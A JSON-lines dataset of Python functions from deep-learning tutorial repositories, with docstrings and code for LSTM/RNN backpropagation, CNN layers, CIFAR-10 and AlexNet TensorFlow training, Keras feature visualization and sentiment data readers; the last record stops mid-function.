{"docstring": "\"\"\"\nConverts an array of sentences (strings) into an array of indices corresponding to words in the sentences.\nThe output shape should be such that it can be given to `Embedding()`\n\nArguments:\nX -- array of sentences (strings), of shape (m, 1)\nword_to_index -- a dictionary containing the each word mapped to its index\nmax_len -- maximum number of words in a sentence. You can assume every sentence in X is no longer than this.\n\nReturns:\nX_indices -- array of indices corresponding to words in the sentences from X, of shape (m, max_len)\n\"\"\"\n\n", "func_signal": "def sentences_to_indices(X, word_to_index, max_len):\n", "code": "m = X.shape[0]  # number of training examples\n# Initialize X_indices as a numpy matrix of zeros and the correct shape (\u2248 1 line)\nX_indices = np.zeros((m, max_len))\n\nfor i in range(m):  # loop over training examples\n    # Convert the ith training sentence in lower case and split is into words. You should get a list of words.\n    sentence_words = (X[i].lower()).split()\n    # Initialize j to 0\n    j = 0\n    # Loop over the words of sentence_words\n    for w in sentence_words:\n        # Set the (i,j)th entry of X_indices to the index of the correct word.\n        X_indices[i, j] = word_to_index[w]\n        # Increment j to j + 1\n        j = j + 1\nreturn X_indices", "path": "SentimentAnalysisProject\\main.py", "repo_name": "omerbsezer/LSTM_RNN_Tutorials_with_Demo", "stars": 529, "license": "None", "language": "python", "size": 322}
{"docstring": "\"\"\"\nArguments:\nda_next -- Gradients of next hidden state, of shape (n_a, m)\ndc_next -- Gradients of next cell state, of shape (n_a, m)\ncache -- cache storing information from the forward pass\n\nReturns:\ngradients -- python dictionary containing:\n                    dxt -- Gradient of input data at time-step t, of shape (n_x, m)\n                    da_prev -- Gradient w.r.t. the previous hidden state, numpy array of shape (n_a, m)\n                    dc_prev -- Gradient w.r.t. the previous memory state, of shape (n_a, m, T_x)\n                    dWf -- Gradient w.r.t. the weight matrix of the forget gate, numpy array of shape (n_a, n_a + n_x)\n                    dWi -- Gradient w.r.t. the weight matrix of the update gate, numpy array of shape (n_a, n_a + n_x)\n                    dWc -- Gradient w.r.t. the weight matrix of the memory gate, numpy array of shape (n_a, n_a + n_x)\n                    dWo -- Gradient w.r.t. the weight matrix of the output gate, numpy array of shape (n_a, n_a + n_x)\n                    dbf -- Gradient w.r.t. biases of the forget gate, of shape (n_a, 1)\n                    dbi -- Gradient w.r.t. biases of the update gate, of shape (n_a, 1)\n                    dbc -- Gradient w.r.t. biases of the memory gate, of shape (n_a, 1)\n                    dbo -- Gradient w.r.t. biases of the output gate, of shape (n_a, 1)\n\"\"\"\n\n# Retrieve information from \"cache\"\n", "func_signal": "def lstm_cell_backward(da_next, dc_next, cache):\n", "code": "(a_next, c_next, a_prev, c_prev, ft, it, cct, ot, xt, parameters) = cache\n\n# Retrieve dimensions from xt's and a_next's shape\nn_x, m = xt.shape\nn_a, m = a_next.shape\n\n# Compute gates related derivatives\ndot = da_next * np.tanh(c_next) * ot * (1 - ot)\ndcct = (dc_next * it + ot * (1 - np.square(np.tanh(c_next))) * it * da_next) * (1 - np.square(cct))\ndit = (dc_next * cct + ot * (1 - np.square(np.tanh(c_next))) * cct * da_next) * it * (1 - it)\ndft = (dc_next * c_prev + ot * (1 - np.square(np.tanh(c_next))) * c_prev * da_next) * ft * (1 - ft)\n\nconcat = np.concatenate((a_prev, xt), axis=0)\n\n# Compute parameters related derivatives.\ndWf = np.dot(dft, concat.T)\ndWi = np.dot(dit, concat.T)\ndWc = np.dot(dcct, concat.T)\ndWo = np.dot(dot, concat.T)\ndbf = np.sum(dft, axis=1, keepdims=True)\ndbi = np.sum(dit, axis=1, keepdims=True)\ndbc = np.sum(dcct, axis=1, keepdims=True)\ndbo = np.sum(dot, axis=1, keepdims=True)\n\n# Compute derivatives w.r.t previous hidden state, previous memory state and input. Use equations (15)-(17). (\u22483 lines)\nda_prev = np.dot(parameters['Wf'][:, :n_a].T, dft) + np.dot(parameters['Wi'][:, :n_a].T, dit) + np.dot(\n    parameters['Wc'][:, :n_a].T, dcct) + np.dot(parameters['Wo'][:, :n_a].T, dot)\ndc_prev = dc_next * ft + ot * (1 - np.square(np.tanh(c_next))) * ft * da_next\ndxt = np.dot(parameters['Wf'][:, n_a:].T, dft) + np.dot(parameters['Wi'][:, n_a:].T, dit) + np.dot(\n    parameters['Wc'][:, n_a:].T, dcct) + np.dot(parameters['Wo'][:, n_a:].T, dot)\n\n# Save gradients in dictionary\ngradients = {\"dxt\": dxt, \"da_prev\": da_prev, \"dc_prev\": dc_prev, \"dWf\": dWf, \"dbf\": dbf, \"dWi\": dWi, \"dbi\": dbi,\n             \"dWc\": dWc, \"dbc\": dbc, \"dWo\": dWo, \"dbo\": dbo}\n\nreturn gradients", "path": "BasicLSTM\\main.py", "repo_name": "omerbsezer/LSTM_RNN_Tutorials_with_Demo", "stars": 529, "license": "None", "language": "python", "size": 322}
{"docstring": "\"\"\"\nArguments:\nda -- Upstream gradients of all hidden states, of shape (n_a, m, T_x)\ncaches -- tuple containing information from the forward pass (rnn_forward)\n\nReturns:\ngradients -- python dictionary containing:\n                    dx -- Gradient w.r.t. the input data, numpy-array of shape (n_x, m, T_x)\n                    da0 -- Gradient w.r.t the initial hidden state, numpy-array of shape (n_a, m)\n                    dWax -- Gradient w.r.t the input's weight matrix, numpy-array of shape (n_a, n_x)\n                    dWaa -- Gradient w.r.t the hidden state's weight matrix, numpy-arrayof shape (n_a, n_a)\n                    dba -- Gradient w.r.t the bias, of shape (n_a, 1)\n\"\"\"\n\n# Retrieve values from the first cache (t=1) of caches \n", "func_signal": "def rnn_backward(da, caches):\n", "code": "(caches, x) = caches\n(a1, a0, x1, parameters) = caches[0]\n\n# Retrieve dimensions from da's and x1's shapes \nn_a, m, T_x = da.shape\nn_x, m = x1.shape\n\n# initialize the gradients with the right sizes \ndx = np.zeros((n_x, m, T_x))\ndWax = np.zeros((n_a, n_x))\ndWaa = np.zeros((n_a, n_a))\ndba = np.zeros((n_a, 1))\nda0 = np.zeros((n_a, m))\nda_prevt = np.zeros((n_a, m))\n\n# Loop through all the time steps\nfor t in reversed(range(T_x)):\n    # Compute gradients at time step t. Choose wisely the \"da_next\" and the \"cache\" to use in the backward propagation step. \n    gradients = rnn_cell_backward(da[:, :, t] + da_prevt, caches[t])\n    # Retrieve derivatives from gradients \n    dxt, da_prevt, dWaxt, dWaat, dbat = gradients[\"dxt\"], gradients[\"da_prev\"], gradients[\"dWax\"], gradients[\n        \"dWaa\"], gradients[\"dba\"]\n    # Increment global derivatives w.r.t parameters by adding their derivative at time-step t\n    dx[:, :, t] = dxt\n    dWax += dWaxt\n    dWaa += dWaat\n    dba += dbat\n\n# Set da0 to the gradient of a which has been backpropagated through all time-steps\nda0 = da_prevt\n\n# Store the gradients in a python dictionary\ngradients = {\"dx\": dx, \"da0\": da0, \"dWax\": dWax, \"dWaa\": dWaa, \"dba\": dba}\n\nreturn gradients", "path": "BasicRNN\\main.py", "repo_name": "omerbsezer/LSTM_RNN_Tutorials_with_Demo", "stars": 529, "license": "None", "language": "python", "size": 322}
{"docstring": "'''\n\u8ba1\u7b97\u5377\u79ef\u5c42\u7684\u8f93\u51fa\n\u8f93\u51fa\u7ed3\u679c\u4fdd\u5b58\u5728self.output_array\n'''\n", "func_signal": "def forward(self, input_array):\n", "code": "self.input_array = input_array\nself.padded_input_array = padding(input_array,\n    self.zero_padding)\nfor f in range(self.filter_number):\n    filter = self.filters[f]\n    conv(self.padded_input_array, \n        filter.get_weights(), self.output_array[f],\n        self.stride, filter.get_bias())\nelement_wise_op(self.output_array, \n                self.activator.forward)", "path": "1.mnist\\cnn.py", "repo_name": "huxiaoman7/PaddlePaddle_code", "stars": 564, "license": "apache-2.0", "language": "python", "size": 241}
{"docstring": "\"\"\"Calculate the average gradient for each shared variable across all towers.\n\nNote that this function provides a synchronization point across all towers.\n\nArgs:\n  tower_grads: List of lists of (gradient, variable) tuples. The outer list\n    is over individual gradients. The inner list is over the gradient\n    calculation for each tower.\nReturns:\n   List of pairs of (gradient, variable) where the gradient has been averaged\n   across all towers.\n\"\"\"\n", "func_signal": "def average_gradients(tower_grads):\n", "code": "average_grads = []\nfor grad_and_vars in zip(*tower_grads):\n  # Note that each grad_and_vars looks like the following:\n  #   ((grad0_gpu0, var0_gpu0), ... , (grad0_gpuN, var0_gpuN))\n  grads = []\n  for g, _ in grad_and_vars:\n    # Add 0 dimension to the gradients to represent the tower.\n    expanded_g = tf.expand_dims(g, 0)\n\n    # Append on a 'tower' dimension which we will average over below.\n    grads.append(expanded_g)\n\n  # Average over the 'tower' dimension.\n  grad = tf.concat(axis=0, values=grads)\n  grad = tf.reduce_mean(grad, 0)\n\n  # Keep in mind that the Variables are redundant because they are shared\n  # across towers. So .. we will just return the first tower's pointer to\n  # the Variable.\n  v = grad_and_vars[0][1]\n  grad_and_var = (grad, v)\n  average_grads.append(grad_and_var)\nreturn average_grads", "path": "3.image_classification\\cifar_tf\\cifar10_multi_gpu_train.py", "repo_name": "huxiaoman7/PaddlePaddle_code", "stars": 564, "license": "apache-2.0", "language": "python", "size": 241}
{"docstring": "'''\n\u63d0\u53d6hypercolumn\u5e76\u53ef\u89c6\u5316.\n:param layers_extract: \u6307\u5b9a\u5c42\u5217\u8868\n:return: None\n'''\n", "func_signal": "def extract_features_with_layers(layers_extract):\n", "code": "hc = extract_hypercolumn(x[0], layers_extract, x[1])\nave = np.average(hc.transpose(1, 2, 0), axis=2)\nplt.imshow(ave)\nplt.show()", "path": "3.image_classification\\keras_model_visualization.py", "repo_name": "huxiaoman7/PaddlePaddle_code", "stars": 564, "license": "apache-2.0", "language": "python", "size": 241}
{"docstring": "'''\n\u4e3a\u6570\u7ec4\u589e\u52a0Zero padding\uff0c\u81ea\u52a8\u9002\u914d\u8f93\u5165\u4e3a2D\u548c3D\u7684\u60c5\u51b5\n'''\n", "func_signal": "def padding(input_array, zp):\n", "code": "if zp == 0:\n    return input_array\nelse:\n    if input_array.ndim == 3:\n        input_width = input_array.shape[2]\n        input_height = input_array.shape[1]\n        input_depth = input_array.shape[0]\n        padded_array = np.zeros((\n            input_depth, \n            input_height + 2 * zp,\n            input_width + 2 * zp))\n        padded_array[:,\n            zp : zp + input_height,\n            zp : zp + input_width] = input_array\n        return padded_array\n    elif input_array.ndim == 2:\n        input_width = input_array.shape[1]\n        input_height = input_array.shape[0]\n        padded_array = np.zeros((\n            input_height + 2 * zp,\n            input_width + 2 * zp))\n        padded_array[zp : zp + input_height,\n            zp : zp + input_width] = input_array\n        return padded_array", "path": "1.mnist\\cnn.py", "repo_name": "huxiaoman7/PaddlePaddle_code", "stars": 564, "license": "apache-2.0", "language": "python", "size": 241}
{"docstring": "\"\"\"Run the benchmark on AlexNet.\"\"\"\n", "func_signal": "def run_benchmark():\n", "code": "with tf.Graph().as_default():\n  image_size = 224\n  images = tf.Variable(tf.random_normal([FLAGS.batch_size,\n                                         image_size,\n                                         image_size, 3],\n                                        dtype=tf.float32,\n                                        stddev=1e-1))\n\n  pool5, parameters = inference(images)\n\n  init = tf.global_variables_initializer()\n\n  config = tf.ConfigProto()\n  config.gpu_options.allocator_type = 'BFC'\n  sess = tf.Session(config=config)\n  sess.run(init)\n\n  time_tensorflow_run(sess, pool5, \"Forward\")\n\n  objective = tf.nn.l2_loss(pool5)\n  grad = tf.gradients(objective, parameters)\n  time_tensorflow_run(sess, grad, \"Forward-backward\")", "path": "3.image_classification\\alexnet_tf.py", "repo_name": "huxiaoman7/PaddlePaddle_code", "stars": 564, "license": "apache-2.0", "language": "python", "size": 241}
{"docstring": "# \u52a0\u8f7d\u6444\u50cf\u5934\n", "func_signal": "def test_opencv():\n", "code": "cam = VideoCapture(0)  # 0 -> \u6444\u50cf\u5934\u5e8f\u53f7\uff0c\u5982\u679c\u6709\u4e24\u4e2a\u4e09\u4e2a\u56db\u4e2a\u6444\u50cf\u5934\uff0c\u8981\u8c03\u7528\u54ea\u4e00\u4e2a\u6570\u5b57\u5f80\u4e0a\u52a0\u561b\n# \u6293\u62cd 5 \u5f20\u5c0f\u56fe\u7247\nfor x in range(0, 5):\n    s, img = cam.read()\n    if s:\n        imwrite(\"o-\" + str(x) + \".jpg\", img)", "path": "3.image_classification\\keras_model_visualization.py", "repo_name": "huxiaoman7/PaddlePaddle_code", "stars": 564, "license": "apache-2.0", "language": "python", "size": 241}
{"docstring": "'''\n\u6309\u7167\u68af\u5ea6\u4e0b\u964d\uff0c\u66f4\u65b0\u6743\u91cd\n'''\n", "func_signal": "def update(self):\n", "code": "for filter in self.filters:\n    filter.update(self.learning_rate)", "path": "1.mnist\\cnn.py", "repo_name": "huxiaoman7/PaddlePaddle_code", "stars": 564, "license": "apache-2.0", "language": "python", "size": 241}
{"docstring": "\"\"\"Calculate the total loss on a single tower running the CIFAR model.\n\nArgs:\n  scope: unique prefix string identifying the CIFAR tower, e.g. 'tower_0'\n  images: Images. 4D tensor of shape [batch_size, height, width, 3].\n  labels: Labels. 1D tensor of shape [batch_size].\n\nReturns:\n   Tensor of shape [] containing the total loss for a batch of data\n\"\"\"\n\n# Build inference Graph.\n", "func_signal": "def tower_loss(scope, images, labels):\n", "code": "logits = cifar10.inference(images)\n\n# Build the portion of the Graph calculating the losses. Note that we will\n# assemble the total_loss using a custom function below.\n_ = cifar10.loss(logits, labels)\n\n# Assemble all of the losses for the current tower only.\nlosses = tf.get_collection('losses', scope)\n\n# Calculate the total loss for the current tower.\ntotal_loss = tf.add_n(losses, name='total_loss')\n\n# Attach a scalar summary to all individual losses and the total loss; do the\n# same for the averaged version of the losses.\nfor l in losses + [total_loss]:\n  # Remove 'tower_[0-9]/' from the name in case this is a multi-GPU training\n  # session. This helps the clarity of presentation on tensorboard.\n  loss_name = re.sub('%s_[0-9]*/' % cifar10.TOWER_NAME, '', l.op.name)\n  tf.summary.scalar(loss_name, l)\n\nreturn total_loss", "path": "3.image_classification\\cifar_tf\\cifar10_multi_gpu_train.py", "repo_name": "huxiaoman7/PaddlePaddle_code", "stars": 564, "license": "apache-2.0", "language": "python", "size": 241}
{"docstring": "# The image is 32 * 32 with RGB representation.\n", "func_signal": "def inference_network():\n", "code": "data_shape = [3, 32, 32]\nimages = fluid.layers.data(name='pixel', shape=data_shape, dtype='float32')\n\npredict = resnet_cifar10(images, 32)\n# predict = vgg_bn_drop(images) # un-comment to use vgg net\nreturn predict", "path": "3.image_classification\\train_fluid.py", "repo_name": "huxiaoman7/PaddlePaddle_code", "stars": 564, "license": "apache-2.0", "language": "python", "size": 241}
{"docstring": "\"\"\"Eval CIFAR-10 for a number of steps.\"\"\"\n", "func_signal": "def evaluate():\n", "code": "with tf.Graph().as_default() as g:\n  # Get images and labels for CIFAR-10.\n  eval_data = FLAGS.eval_data == 'test'\n  images, labels = cifar10.inputs(eval_data=eval_data)\n\n  # Build a Graph that computes the logits predictions from the\n  # inference model.\n  logits = cifar10.inference(images)\n\n  # Calculate predictions.\n  top_k_op = tf.nn.in_top_k(logits, labels, 1)\n\n  # Restore the moving average version of the learned variables for eval.\n  variable_averages = tf.train.ExponentialMovingAverage(\n      cifar10.MOVING_AVERAGE_DECAY)\n  variables_to_restore = variable_averages.variables_to_restore()\n  saver = tf.train.Saver(variables_to_restore)\n\n  # Build the summary operation based on the TF collection of Summaries.\n  summary_op = tf.summary.merge_all()\n\n  summary_writer = tf.summary.FileWriter(FLAGS.eval_dir, g)\n\n  while True:\n    eval_once(saver, summary_writer, top_k_op, summary_op)\n    if FLAGS.run_once:\n      break\n    time.sleep(FLAGS.eval_interval_secs)", "path": "3.image_classification\\cifar_tf\\cifar10_eval.py", "repo_name": "huxiaoman7/PaddlePaddle_code", "stars": 564, "license": "apache-2.0", "language": "python", "size": 241}
{"docstring": "# \u52a0\u8f7dfine-tuning googlenet v3\u6a21\u578b\uff0c\u5e76\u505a\u9884\u6d4b\n", "func_signal": "def load_fine_tune_googlenet_v3(img):\n", "code": "model = InceptionV3(include_top=True, weights='imagenet')\nmodel.summary()\nx = image.img_to_array(img)\nx = np.expand_dims(x, axis=0)\nx = preprocess_input(x)\npreds = model.predict(x)\nprint('Predicted:', decode_predictions(preds))\nplt.subplot(212)\nplt.plot(preds.ravel())\nplt.show()\nreturn model, x", "path": "3.image_classification\\keras_model_visualization.py", "repo_name": "huxiaoman7/PaddlePaddle_code", "stars": 564, "license": "apache-2.0", "language": "python", "size": 241}
{"docstring": "'''\n\u63d0\u53d6\u6307\u5b9a\u6a21\u578b\u6307\u5b9a\u5c42\u7684hypercolumn\u5411\u91cf\n:param model: \u6a21\u578b\n:param layer_indexes: \u5c42id\n:param instance: \u6a21\u578b\n:return:\n'''\n", "func_signal": "def extract_hypercolumn(model, layer_indexes, instance):\n", "code": "feature_maps = []\nfor i in layer_indexes:\n    feature_maps.append(Model(input=model.input, output=model.get_layer(index=i).output).predict(instance))\nhypercolumns = []\nfor convmap in feature_maps:\n    for i in convmap[0][0][0]:\n        upscaled = sp.misc.imresize(convmap[0, :, :, i], size=(299, 299), mode=\"F\", interp='bilinear')\n        hypercolumns.append(upscaled)\nreturn np.asarray(hypercolumns)", "path": "3.image_classification\\keras_model_visualization.py", "repo_name": "huxiaoman7/PaddlePaddle_code", "stars": 564, "license": "apache-2.0", "language": "python", "size": 241}
{"docstring": "\"\"\"Train CIFAR-10 for a number of steps.\"\"\"\n", "func_signal": "def train():\n", "code": "with tf.Graph().as_default(), tf.device('/cpu:0'):\n  # Create a variable to count the number of train() calls. This equals the\n  # number of batches processed * FLAGS.num_gpus.\n  global_step = tf.get_variable(\n      'global_step', [],\n      initializer=tf.constant_initializer(0), trainable=False)\n\n  # Calculate the learning rate schedule.\n  num_batches_per_epoch = (cifar10.NUM_EXAMPLES_PER_EPOCH_FOR_TRAIN /\n                           FLAGS.batch_size)\n  decay_steps = int(num_batches_per_epoch * cifar10.NUM_EPOCHS_PER_DECAY)\n\n  # Decay the learning rate exponentially based on the number of steps.\n  lr = tf.train.exponential_decay(cifar10.INITIAL_LEARNING_RATE,\n                                  global_step,\n                                  decay_steps,\n                                  cifar10.LEARNING_RATE_DECAY_FACTOR,\n                                  staircase=True)\n\n  # Create an optimizer that performs gradient descent.\n  opt = tf.train.GradientDescentOptimizer(lr)\n\n  # Get images and labels for CIFAR-10.\n  images, labels = cifar10.distorted_inputs()\n  batch_queue = tf.contrib.slim.prefetch_queue.prefetch_queue(\n        [images, labels], capacity=2 * FLAGS.num_gpus)\n  # Calculate the gradients for each model tower.\n  tower_grads = []\n  with tf.variable_scope(tf.get_variable_scope()):\n    for i in xrange(FLAGS.num_gpus):\n      with tf.device('/gpu:%d' % i):\n        with tf.name_scope('%s_%d' % (cifar10.TOWER_NAME, i)) as scope:\n          # Dequeues one batch for the GPU\n          image_batch, label_batch = batch_queue.dequeue()\n          # Calculate the loss for one tower of the CIFAR model. This function\n          # constructs the entire CIFAR model but shares the variables across\n          # all towers.\n          loss = tower_loss(scope, image_batch, label_batch)\n\n          # Reuse variables for the next tower.\n          tf.get_variable_scope().reuse_variables()\n\n          # Retain the summaries from the final tower.\n          summaries = tf.get_collection(tf.GraphKeys.SUMMARIES, scope)\n\n          # Calculate the gradients for the batch of data on this CIFAR tower.\n          grads = opt.compute_gradients(loss)\n\n          # Keep track of the gradients across all towers.\n          tower_grads.append(grads)\n\n  # We must calculate the mean of each gradient. Note that this is the\n  # synchronization point across all towers.\n  grads = average_gradients(tower_grads)\n\n  # Add a summary to track the learning rate.\n  summaries.append(tf.summary.scalar('learning_rate', lr))\n\n  # Add histograms for gradients.\n  for grad, var in grads:\n    if grad is not None:\n      summaries.append(tf.summary.histogram(var.op.name + '/gradients', grad))\n\n  # Apply the gradients to adjust the shared variables.\n  apply_gradient_op = opt.apply_gradients(grads, global_step=global_step)\n\n  # Add histograms for trainable variables.\n  for var in tf.trainable_variables():\n    summaries.append(tf.summary.histogram(var.op.name, var))\n\n  # Track the moving averages of all trainable variables.\n  variable_averages = tf.train.ExponentialMovingAverage(\n      cifar10.MOVING_AVERAGE_DECAY, global_step)\n  variables_averages_op = variable_averages.apply(tf.trainable_variables())\n\n  # Group all updates to into a single train op.\n  train_op = tf.group(apply_gradient_op, variables_averages_op)\n\n  # Create a saver.\n  saver = tf.train.Saver(tf.global_variables())\n\n  # Build the summary operation from the last tower summaries.\n  summary_op = tf.summary.merge(summaries)\n\n  # Build an initialization operation to run below.\n  init = tf.global_variables_initializer()\n\n  # Start running operations on the Graph. allow_soft_placement must be set to\n  # True to build towers on GPU, as some of the ops do not have GPU\n  # implementations.\n  sess = tf.Session(config=tf.ConfigProto(\n      allow_soft_placement=True,\n      log_device_placement=FLAGS.log_device_placement))\n  sess.run(init)\n\n  # Start the queue runners.\n  tf.train.start_queue_runners(sess=sess)\n\n  summary_writer = tf.summary.FileWriter(FLAGS.train_dir, sess.graph)\n\n  for step in xrange(FLAGS.max_steps):\n    start_time = time.time()\n    _, loss_value = sess.run([train_op, loss])\n    duration = time.time() - start_time\n\n    assert not np.isnan(loss_value), 'Model diverged with loss = NaN'\n\n    if step % 10 == 0:\n      num_examples_per_step = FLAGS.batch_size * FLAGS.num_gpus\n      examples_per_sec = num_examples_per_step / duration\n      sec_per_batch = duration / FLAGS.num_gpus\n\n      format_str = ('%s: step %d, loss = %.2f (%.1f examples/sec; %.3f '\n                    'sec/batch)')\n      print (format_str % (datetime.now(), step, loss_value,\n                           examples_per_sec, sec_per_batch))\n\n    if step % 100 == 0:\n      summary_str = sess.run(summary_op)\n      summary_writer.add_summary(summary_str, step)\n\n    # Save the model checkpoint periodically.\n    if step % 1000 == 0 or (step + 1) == FLAGS.max_steps:\n      checkpoint_path = os.path.join(FLAGS.train_dir, 'model.ckpt')\n      saver.save(sess, checkpoint_path, global_step=step)", "path": "3.image_classification\\cifar_tf\\cifar10_multi_gpu_train.py", "repo_name": "huxiaoman7/PaddlePaddle_code", "stars": 564, "license": "apache-2.0", "language": "python", "size": 241}
{"docstring": "'''\n\u63d0\u53d6\u6307\u5b9a\u6a21\u578b\u6307\u5b9a\u5c42\u6307\u5b9a\u6570\u76ee\u7684feature map\u5e76\u8f93\u51fa\u5230\u4e00\u5e45\u56fe\u4e0a.\n:param ins: \u6a21\u578b\u5b9e\u4f8b\n:param layer_id: \u63d0\u53d6\u6307\u5b9a\u5c42\u7279\u5f81\n:param filters: \u6bcf\u5c42\u63d0\u53d6\u7684feature map\u6570\n:param layer_num: \u4e00\u5171\u63d0\u53d6\u591a\u5c11\u5c42feature map\n:return: None\n'''\n", "func_signal": "def extract_features(ins, layer_id, filters, layer_num):\n", "code": "if len(ins) != 2:\n    print('parameter error:(model, instance)')\n    return None\nmodel = ins[0]\nx = ins[1]\nif type(layer_id) == type(1):\n    model_extractfeatures = Model(input=model.input, output=model.get_layer(index=layer_id).output)\nelse:\n    model_extractfeatures = Model(input=model.input, output=model.get_layer(name=layer_id).output)\nfc2_features = model_extractfeatures.predict(x)\nif filters > len(fc2_features[0][0][0]):\n    print('layer number error.', len(fc2_features[0][0][0]),',',filters)\n    return None\nfor i in range(filters):\n    plt.subplots_adjust(left=0, right=1, bottom=0, top=1)\n    plt.subplot(filters, layer_num, layer_id + 1 + i * layer_num)\n    plt.axis(\"off\")\n    if i < len(fc2_features[0][0][0]):\n        plt.imshow(fc2_features[0, :, :, i])", "path": "3.image_classification\\keras_model_visualization.py", "repo_name": "huxiaoman7/PaddlePaddle_code", "stars": 564, "license": "apache-2.0", "language": "python", "size": 241}
{"docstring": "# \u5904\u7406\u5377\u79ef\u6b65\u957f\uff0c\u5bf9\u539f\u59cbsensitivity map\u8fdb\u884c\u6269\u5c55\n", "func_signal": "def bp_gradient(self, sensitivity_array):\n", "code": "expanded_array = self.expand_sensitivity_map(\n    sensitivity_array)\nfor f in range(self.filter_number):\n    # \u8ba1\u7b97\u6bcf\u4e2a\u6743\u91cd\u7684\u68af\u5ea6\n    filter = self.filters[f]\n    for d in range(filter.weights.shape[0]):\n        conv(self.padded_input_array[d], \n             expanded_array[f],\n             filter.weights_grad[d], 1, 0)\n    # \u8ba1\u7b97\u504f\u7f6e\u9879\u7684\u68af\u5ea6\n    filter.bias_grad = expanded_array[f].sum()", "path": "1.mnist\\cnn.py", "repo_name": "huxiaoman7/PaddlePaddle_code", "stars": 564, "license": "apache-2.0", "language": "python", "size": 241}
{"docstring": "\"\"\"\n\u521b\u5efa\u6d4b\u8bd5\u6570\u636ereader\n:param data_dir: \u6570\u636e\u5730\u5740.\n:type data_dir: str\n:param word_dict: \u8bcd\u5178\u5730\u5740,\n    \u8bcd\u5178\u91cc\u5fc5\u987b\u6709 \"UNK\" .\n:type word_dict:python dict\n\"\"\"\n\n", "func_signal": "def test_reader(data_dir, word_dict):\n", "code": "def reader():\n    UNK_ID = word_dict[\"<UNK>\"]\n    word_col = 1\n\n    for file_name in os.listdir(data_dir):\n        with open(os.path.join(data_dir, file_name), \"r\") as f:\n            for line in f:\n                line_split = line.strip().split(\"\\t\")\n                if len(line_split) < word_col: continue\n                word_ids = [\n                    word_dict.get(w, UNK_ID)\n                    for w in line_split[word_col].split()\n                ]\n                yield word_ids, line_split[word_col]\n\nreturn reader", "path": "2.data_processing\\sentiment_analyze.py", "repo_name": "huxiaoman7/PaddlePaddle_code", "stars": 564, "license": "apache-2.0", "language": "python", "size": 241}
{"docstring": "\"\"\"\n   \u521b\u5efa\u8bad\u7ec3\u6570\u636ereader\n:param data_dir: \u6570\u636e\u5730\u5740.\n:type data_dir: str\n:param word_dict: \u8bcd\u5178\u5730\u5740,\n    \u8bcd\u5178\u91cc\u5fc5\u987b\u6709 \"UNK\" .\n:type word_dict:python dict\n:param label_dict: label \u5b57\u5178\u7684\u5730\u5740\n:type label_dict: Python dict\n\"\"\"\n\n", "func_signal": "def train_reader(data_dir, word_dict, label_dict):\n", "code": "def reader():\n    UNK_ID = word_dict[\"<UNK>\"]\n    word_col = 1\n    lbl_col = 0\n\n    for file_name in os.listdir(data_dir):\n        with open(os.path.join(data_dir, file_name), \"r\") as f:\n            for line in f:\n                line_split = line.strip().split(\"\\t\")\n                word_ids = [\n                    word_dict.get(w, UNK_ID)\n                    for w in line_split[word_col].split()\n                ]\n                yield word_ids, label_dict[line_split[lbl_col]]\n\nreturn reader", "path": "2.data_processing\\sentiment_analyze.py", "repo_name": "huxiaoman7/PaddlePaddle_code", "stars": 564, "license": "apache-2.0", "language": "python", "size": 241}
{"docstring": "# \u628a\u539f\u59cb\u56fe\u7247\u538b\u7f29\u4e3a 299*299\u5927\u5c0f\n", "func_signal": "def load_original(img_path):\n", "code": "im_original = cv2.resize(cv2.imread(img_path), (299, 299))\nim_converted = cv2.cvtColor(im_original, cv2.COLOR_BGR2RGB)\nplt.figure(0)\nplt.subplot(211)\nplt.imshow(im_converted)\nreturn im_original", "path": "3.image_classification\\keras_model_visualization.py", "repo_name": "huxiaoman7/PaddlePaddle_code", "stars": 564, "license": "apache-2.0", "language": "python", "size": 241}
{"docstring": "'''\n\u6279\u91cf\u63d0\u53d6\u7279\u5f81\n:param layer_num: \u5c42\u6570\n:param model: \u6a21\u578b\n:param filters: feature map\u6570\n:return: None\n'''\n", "func_signal": "def extract_features_batch(layer_num, model, filters):\n", "code": "plt.figure(figsize=(filters, layer_num))\nplt.subplot(filters, layer_num, 1)\nfor i in range(layer_num):\n    extract_features(model, i, filters, layer_num)\nplt.savefig('sample.jpg')\nplt.show()", "path": "3.image_classification\\keras_model_visualization.py", "repo_name": "huxiaoman7/PaddlePaddle_code", "stars": 564, "license": "apache-2.0", "language": "python", "size": 241}
{"docstring": "'''\nAlexnet\u6a21\u578b\n\u8f93\u5165\uff1aimages\u7684tensor\n\u8fd4\u56de\uff1aAlexnet\u7684\u6700\u540e\u4e00\u5c42\u5377\u79ef\u5c42\n\n'''\n", "func_signal": "def inference(images):\n", "code": "parameters = []\n# conv1\nwith tf.name_scope('conv1') as scope:\n  kernel = tf.Variable(tf.truncated_normal([11, 11, 3, 64], dtype=tf.float32,\n                                           stddev=1e-1), name='weights')\n  conv = tf.nn.conv2d(images, kernel, [1, 4, 4, 1], padding='SAME')\n  biases = tf.Variable(tf.constant(0.0, shape=[64], dtype=tf.float32),\n                       trainable=True, name='biases')\n  bias = tf.nn.bias_add(conv, biases)\n  conv1 = tf.nn.relu(bias, name=scope)\n  print_activations(conv1)\n  parameters += [kernel, biases]\n\n# lrn1\nwith tf.name_scope('lrn1') as scope:\n  lrn1 = tf.nn.local_response_normalization(conv1,\n                                            alpha=1e-4,\n                                            beta=0.75,\n                                            depth_radius=2,\n                                            bias=2.0)\n\n# pool1\npool1 = tf.nn.max_pool(lrn1,\n                       ksize=[1, 3, 3, 1],\n                       strides=[1, 2, 2, 1],\n                       padding='VALID',\n                       name='pool1')\nprint_activations(pool1)\n\n# conv2\nwith tf.name_scope('conv2') as scope:\n  kernel = tf.Variable(tf.truncated_normal([5, 5, 64, 192], dtype=tf.float32,\n                                           stddev=1e-1), name='weights')\n  conv = tf.nn.conv2d(pool1, kernel, [1, 1, 1, 1], padding='SAME')\n  biases = tf.Variable(tf.constant(0.0, shape=[192], dtype=tf.float32),\n                       trainable=True, name='biases')\n  bias = tf.nn.bias_add(conv, biases)\n  conv2 = tf.nn.relu(bias, name=scope)\n  parameters += [kernel, biases]\nprint_activations(conv2)\n\n# lrn2\nwith tf.name_scope('lrn2') as scope:\n  lrn2 = tf.nn.local_response_normalization(conv2,\n                                            alpha=1e-4,\n                                            beta=0.75,\n                                            depth_radius=2,\n                                            bias=2.0)\n\n# pool2\npool2 = tf.nn.max_pool(lrn2,\n                       ksize=[1, 3, 3, 1],\n                       strides=[1, 2, 2, 1],\n                       padding='VALID',\n                       name='pool2')\nprint_activations(pool2)\n\n# conv3\nwith tf.name_scope('conv3') as scope:\n  kernel = tf.Variable(tf.truncated_normal([3, 3, 192, 384],\n                                           dtype=tf.float32,\n                                           stddev=1e-1), name='weights')\n  